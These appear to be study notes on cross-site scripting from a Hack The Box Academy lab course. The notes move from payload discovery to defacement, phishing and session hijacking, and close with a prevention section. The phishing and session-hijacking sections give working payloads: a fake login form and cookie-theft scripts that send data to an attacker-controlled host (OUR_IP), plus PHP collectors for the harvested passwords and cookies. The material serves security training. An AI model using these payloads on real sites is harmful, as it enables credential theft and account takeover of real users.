XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk. There are three main types of XSS vulnerabilities:

| Type                             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).  **DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.** A `#` is a **clue**, not proof of DOM XSS. Why? The part after `#` (the URL fragment) is normally **not sent to the server**, so if JavaScript reads it and unsafely puts it into the page, it **can** lead to DOM XSS. |

For DOM XSS, remember **Source → JavaScript → Sink**. The **Source** is where user-controlled input comes from, such as a URL, `location.hash`, `location.search`, or form input. JavaScript reads that input and sends it to a **Sink**, which is where it is inserted into the webpage. If user-controlled input reaches an unsafe Sink without sanitization, the page may be vulnerable to DOM XSS.

Common **Sources** to recognize:  `location`,  `location.hash`,  `location.search`,  `document.URL`,  `document.referrer`,  `Form/input values`

Common **Sinks** to recognize: `innerHTML`,  `outerHTML`,  `document.write()`,  jQuery: `append()`, `after()`, `add()`

#### XSS Basic Payloads & Commands:

| Payload                                     | Description            |
| ------------------------------------------- | ---------------------- |
| `<script>alert(window.origin)</script>`     | Basic XSS Payload      |
| `<plaintext>`                               | Basic XSS Payload      |
| `<script>print()</script>`                  | Basic XSS Payload      |
| `document.cookie`                           |                        |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |

# For questions in Section 3,4, 5:

`<script>alert(document.cookie)</script>`

`"><img src=/ onerror=alert(document.cookie)>`

---
---

# Section 5 - XSS Discovery Tools & Servers

The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [Payload-Box](https://github.com/payload-box/xss-payload-list). We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.

Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it. **==Suppose, if you see that the input is being placed directly into the `src` attribute without any sanitation,  you can try a payload like:**==

==`'> <script>alert(window.origin)</script>`, and include anything within that ().==

Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

But, it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code.

|Command|Description|
|---|---|
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a URL parameter|
|`sudo nc -lvnp 80`|Start `netcat` listener|
|`sudo php -S 0.0.0.0:80`|Start `PHP` server|


# Section 6 - # Defacing: Modify the Website

It is a stored XSS vulnerability.

| Payload                                                                                       | Description                               |
| --------------------------------------------------------------------------------------------- | ----------------------------------------- |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color                   |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image                   |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title                      |
| `document.getElementById("todo").innerHTML = "New Text"`                                      | change the text displayed on the web page |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body             |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element               |


---
---

# Section 7 - Phishing

We can easily find HTML code for a basic login form, or we can write our own login form. The following example presents a login form:

```html
<h3>Please login to continue</h3> 
<form action=http://OUR_IP>     
<input type="username" name="username" placeholder="Username">     
<input type="password" name="password" placeholder="Password">    
<input type="submit" name="submit" value="Login"> </form>
```

In the above HTML code, `OUR_IP` is the IP address of our VM.

Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()` and use it in the XSS payload we found earlier during the XSS Discovery step. Once we minify the HTML code into a single line and add it inside the `write()` function, the final JavaScript code is:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

If the website's previous URL field is still visible, the victim may not believe they need to log in. We can find the element's `id` using **Page Inspector (Ctrl+Shift+C)** and then remove it with:

```javascript
document.getElementById('urlform').remove();
```

Here, `urlform` is the `id` of the URL form. This removes the URL form from the page, leaving only the fake login form we added. We can add this line to the end of the previous JavaScript code. 

**==Suppose, in the xss discovery phase, if you see that the input is being placed directly into the `src` attribute without any sanitation,  you can try a payload like:**==

==`'> <script>alert(window.origin)</script>`, and include that full java code within that ().==

The fake login form sends the submitted credentials in the HTTP request URL, such as:

```text
/?username=test&password=test
```

A basic `netcat` listener can capture the request but cannot properly handle it, causing an error that may alert the victim. Instead, a PHP script can **save the submitted username/password to `creds.txt` and redirect the victim back to the original page**, making the login appear normal.

Create `index.php` inside `/tmp/tmpserver/`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Replace `SERVER_IP` with the IP from the exercise.

Then start the PHP server:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

The PHP server now handles the HTTP request, saves the submitted credentials to `creds.txt`, and redirects the victim back to the original page.

So:

The form action=http://OUR_IP → creds come to you.
Your PHP server php -S 0.0.0.0:80 runs on you (OUR_IP).
The redirect Location: http://SERVER_IP/phishing/index.php → sends the victim back to the target’s real page.

---
---

# Section 8 - Session Hijacking

Cookies keep users logged in, so if an attacker steals a victim's session cookie through XSS, they may be able to **hijack the victim's logged-in session without knowing the password**.

[Session Hijacking (XSS)](https://notes.maccgenics.com/02-areas/hack-the-box/htb-academy/bug-bounty-hunter/7-cross-site-scripting-xss/session-hijacking-xss/) 
### Blind XSS

With normal XSS, the result can usually be seen directly. **Blind XSS** is different because the payload is submitted somewhere, but the page where it executes cannot be seen.

For example:

```text
Input → Admin Panel → Admin Browses it → XSS executes
```

Blind XSS commonly appears in **contact forms, reviews, user details, support tickets, and HTTP headers**.

Example:

```text
http://SERVER_IP:PORT/hijacking/index.php
```

After submitting the form, the application may only show:

```text
Thank you for registering. An Admin will review your registration request.
```

Because the Admin Panel is not accessible, it is not possible to see whether the input executed. Instead, use an XSS payload that makes a request back to the Attack Machine. If the server receives the request, the payload executed.

## Finding the Vulnerable Field

Two things need to be discovered: **which field is vulnerable** and **which payload works**. A useful method is to load a remote JavaScript file and use the field name as the requested path.

```html
<script src="http://OUR_IP/script.js"></script>
```

For example, test the username field with:

```html
<script src="http://OUR_IP/username"></script>
```

If the Attack Machine receives:

```text
GET /username
```

then the **username field is vulnerable**. The same method can be used for other fields:

```html
<script src="http://OUR_IP/fullname"></script>
```

```text
GET /fullname
```

Different payloads may be needed depending on how the application handles the input.

## Useful Blind XSS Payloads

```html
<script src=http://OUR_IP></script>
```

```html
'><script src=http://OUR_IP></script>
```

```html
"><script src=http://OUR_IP></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP")</script>
```

Before testing, start a server on the **Attack Machine**:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Then test the fields one by one. Fields with strong validation, such as an email field that must match a valid email format, may be skipped if the input cannot be injected successfully.

## Session Hijacking with XSS

| Order | Do | Why |
|-------|-----|-----|
| 1 | Write **both** files in your server folder: `script.js` + `index.php` | the server serves both |
| 2 | **Start the PHP server:** `sudo php -S 0.0.0.0:80` | must be live so the victim can fetch script.js AND so the cookie has somewhere to land |
| 3 | **Then inject** the payload: `<script src=http://OUR_IP/script.js></script>` | now when it fires, your server is ready to answer |
| 4 | Wait → victim triggers it → `cat cookies.txt` | cookie arrives |


#### Stage 1 — “Here are your 2 payload OPTIONS” (pick ONE)

Once a working XSS payload and vulnerable field are identified, the payload can be changed to send the session cookie to the Attack Machine. Two common payloads are:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

The second method sends the request by creating an image, so the browser does not navigate away from the current page.

#### Stage 2 — “Now DELIVER the chosen payload”

Save the JavaScript as:

```text
script.js
```

Contents:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Then load it through the XSS payload:

```html
<script src=http://OUR_IP/script.js></script>
```

The process is:

```text
XSS → script.js → document.cookie → Attack Machine
```

## Save the Cookies

A PHP script can receive the cookie and save it to `cookies.txt`.

Create `index.php`:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start the PHP server:

```bash
sudo php -S 0.0.0.0:80
```

When the XSS executes, the server may receive:

```text
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

The cookie is also saved in:

```text
cookies.txt
```

Check it with:

```bash
cat cookies.txt
```

Example:

```text
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

## Use the Stolen Cookie

The cookie contains a **name** and **value**:

```text
cookie=f904f93c949d19d870911bf8b05fe7b2
```

```text
Name  = cookie
Value = f904f93c949d19d870911bf8b05fe7b2
```

In the HTB lab, open:

```text
/hijacking/login.php
```

Then use Firefox Developer Tools → **Storage** → Cookies and add the stolen cookie.

After refreshing the page, if the application accepts the cookie, the session may be accessed as the victim.



---
---
# Section 9 - XSS Prevention

XSS mainly happens when **user input (Source)** reaches an unsafe place **(Sink)**. The main defense is to **validate, sanitize, and encode user input on both the front end and back end**.

### Front-end

**Input validation** checks whether the input has the expected format. For example, email validation:

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

**Input sanitization** removes/handles dangerous HTML and JavaScript. DOMPurify can be used:

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

User input should also **not be placed directly** inside `<script>`, `<style>`, HTML attributes, or comments. Avoid unsafe sinks such as:

```text
DOM.innerHTML
DOM.outerHTML
document.write()
document.writeln()
document.domain
```

and jQuery:

```text
html()
parseHTML()
add()
append()
prepend()
after()
insertAfter()
before()
insertBefore()
replaceAll()
replaceWith()
```

### Back-end

Front-end protection can be bypassed by sending custom requests, so **back-end validation and sanitization are essential**.

PHP email validation:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

PHP sanitization:

```php
addslashes($_GET['email'])
```

NodeJS can use DOMPurify:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

Never directly display raw user input such as:

```php
$_GET['email']
```

For output, use **HTML encoding** so special characters become harmless text:

```php
htmlentities($_GET['email']);
```

NodeJS:

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

### Server-Side Protection

Useful additional protections include **HTTPS, security headers, Content-Security-Policy (CSP), and secure cookie settings**:

```text
X-Content-Type-Options=nosniff
Content-Security-Policy: script-src 'self'
HttpOnly
Secure
```

A **WAF** can also detect and block many malicious requests.

